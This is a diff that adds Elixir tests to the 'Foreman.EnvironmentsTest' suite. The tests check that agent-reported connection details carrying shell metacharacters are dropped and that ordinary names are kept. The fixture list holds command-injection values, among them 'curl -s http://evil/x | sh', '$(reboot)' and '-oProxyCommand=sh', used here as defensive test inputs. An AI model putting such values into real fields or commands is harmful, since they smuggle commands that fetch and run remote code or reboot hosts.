@@ -247,6 +247,82 @@ defmodule Foreman.EnvironmentsTest do
       assert Repo.reload!(env).vm == vm
     end
 
+    # They end up in commands people paste into a shell on the box, and
+    # on a VM box they come from inside the VM.
+    test "results carry agent data: connection details that aren't plain names are dropped", %{
+      scope: scope,
+      user: user,
+      repo: repo,
+      box: box
+    } do
+      connect_agent(box)
+
+      for {key, value} <- [
+            {"remote_user", "vscode; curl -s http://evil/x | sh"},
+            {"remote_user", "-oProxyCommand=sh"},
+            {"remote_user", "$(reboot)"},
+            {"remote_workspace_folder", "/w; reboot"},
+            {"remote_workspace_folder", "/w/$(reboot)"},
+            {"remote_workspace_folder", "/my project"},
+            {"remote_workspace_folder", "workspaces/sf"},
+            {"devcontainer_service", "x true; curl -s http://evil/x | sh; #"},
+            {"devcontainer_service", "app`reboot`"},
+            {"devcontainer_service", ""}
+          ] do
+        env =
+          environment_fixture(
+            user: user,
+            repo: repo,
+            box: box,
+            remote_user: "node",
+            workspace_folder: "/workspaces/sf"
+          )
+
+        {:ok, _} = Environments.rebuild(scope, env)
+        assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+        succeed(box, cmd, Map.put(@up_result, key, value))
+
+        env = Repo.reload!(env)
+        assert env.observed_state == "running"
+        refute value in [env.remote_user, env.workspace_folder, env.devcontainer_service]
+      end
+    end
+
+    test "ordinary connection details are kept", %{
+      scope: scope,
+      user: user,
+      repo: repo,
+      box: box
+    } do
+      connect_agent(box)
+
+      for {user_name, folder, service} <- [
+            {"vscode", "/workspaces/storefront", "app"},
+            {"root", "/", "dev.container"},
+            {"node_user", "/home/node/src/my-app@2", "web_1"},
+            {"1000", "/workspaces/a.b+c", "App-2"}
+          ] do
+        env = environment_fixture(user: user, repo: repo, box: box)
+
+        {:ok, _} = Environments.rebuild(scope, env)
+        assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+
+        succeed(box, cmd, %{
+          @up_result
+          | "remote_user" => user_name,
+            "remote_workspace_folder" => folder,
+            "devcontainer_service" => service
+        })
+
+        assert %{
+                 remote_user: ^user_name,
+                 workspace_folder: ^folder,
+                 devcontainer_service: ^service
+               } =
+                 Repo.reload!(env)
+      end
+    end
+
     # A start result's size is what the agent would give a new VM (start
     # carries no limits), not the size of the VM that started.
     test "a start keeps the VM size recorded when the VM was made", %{
